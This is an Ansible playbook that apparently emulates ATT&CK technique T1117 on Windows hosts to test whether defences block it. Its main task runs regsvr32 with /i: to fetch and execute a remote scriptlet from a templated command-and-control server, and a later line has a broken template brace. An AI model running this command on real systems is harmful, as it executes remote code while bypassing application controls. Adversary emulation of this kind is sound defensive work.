#T1117 - Regsvr32
- name: Regsvr32 - Windows
  hosts: windows
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
    - name: Run regsvr32 to download and execute script (create a new file c:\temp\cnc.sct
      win_shell: |
        regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
    - name: check file exist
      tags: always
      stat:
        path: c:\temp\{{ cnc_sct }
      register: T1117
    - name: check if playbook was blocked
      tags: always
      debug: msg="Playbook Completed:T1117:blocked:linux:"
      when: T1117.stat.exists == False        
    - name: check if playbook was successfull
      tags: always
      debug: msg="Playbook Completed:T1117:passed:linux:"
      when: T1117.stat.exists  
